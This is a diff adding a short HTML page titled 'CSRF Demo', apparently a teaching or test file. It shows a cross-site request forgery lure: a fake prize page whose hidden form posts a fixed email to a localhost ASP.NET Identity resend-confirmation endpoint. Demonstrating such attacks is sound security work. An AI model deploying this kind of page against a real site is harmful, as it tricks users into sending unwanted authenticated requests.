@@ -1,0 +1,10 @@
+<html>
+    <title>CSRF Demo</title>
+    <body>
+        <h1>Congratulations! You're a Winner!</h1>
+        <form action="https://localhost:7250/Identity/Account/ResendEmailConfirmation" method="post">
+            <input type="hidden" name="Input.Email" value="name@example.com" />
+            <input type="submit" value="Click to collect your prize!" />
+        </form>
+    </body>
+</html>
